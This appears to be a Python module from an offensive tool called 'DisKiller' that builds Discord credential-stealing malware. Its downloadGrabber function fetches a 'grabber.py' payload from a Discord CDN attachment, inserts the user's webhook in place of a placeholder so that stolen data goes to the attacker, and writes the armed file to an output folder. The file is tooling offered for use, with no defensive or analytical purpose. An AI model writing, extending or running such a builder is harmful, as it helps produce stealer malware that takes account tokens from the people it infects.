import requests
from data.common import *

def downloadGrabber(webhook):
    set_console_title("DisKiller  | Download Grabber")
    url = 'https://cdn.discordapp.com/attachments/1014530090794766482/1014605376471183390/grabber.py'
    r = requests.get(url, allow_redirects=True)
    open('output/grabber.py', 'w', encoding='utf-8').write(r.content.decode().replace("WEBHOOK HERE", webhook))
    print(f"{rr}[ {w}+ {rr}]{w} Downloaded Successfully {rr}| {w}File in {rr}/output/grabber.py{Fore.RESET}\n")
    input('Press any key to continue')